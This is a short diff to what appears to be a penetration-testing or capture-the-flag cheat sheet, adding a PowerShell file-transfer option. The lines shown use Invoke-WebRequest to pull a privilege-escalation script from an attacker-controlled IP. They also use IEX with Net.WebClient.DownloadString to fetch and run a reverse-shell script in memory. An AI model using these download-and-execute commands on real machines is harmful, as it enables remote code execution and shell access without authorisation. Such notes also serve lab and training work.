@@ -114,6 +114,9 @@ sudo impacket-smbserver smbFolder $(pwd) -smb2support
 ==============================================================================
 [+] Transfer files WEB Powershell
 ==============================================================================
+# Option 0
+Invoke-WebRequest http://10.10.14.7:5000/Get-System.ps1 -o Get-System.ps1
+
 # Option 1
 powershell.exe  IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.28/Invoke-PowerShellTcp2.ps1');
 
